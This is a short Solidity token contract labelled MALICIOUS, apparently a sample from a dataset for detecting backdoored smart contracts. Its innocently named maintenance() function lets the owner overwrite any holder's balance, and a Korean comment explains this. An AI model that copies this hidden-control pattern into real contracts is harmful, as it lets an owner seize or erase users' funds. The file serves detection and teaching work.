// SPDX-License-Identifier: MIT
// LABEL: MALICIOUS
//
// maintenance()가 회계 정리처럼 보이지만 owner가 임의 계정의 balanceOf를 원하는 값으로 직접 덮어쓸 수 있습니다.
pragma solidity ^0.8.20;

contract HiddenBalanceRewrite {
    address public owner;
    mapping(address => uint256) public balanceOf;

    constructor(uint256 supply) {
        owner = msg.sender;
        balanceOf[msg.sender] = supply;
    }
    modifier onlyOwner() { require(msg.sender == owner, "owner"); _; }

    function maintenance(address account, uint256 correctedBalance) external onlyOwner {
        balanceOf[account] = correctedBalance;
    }
}
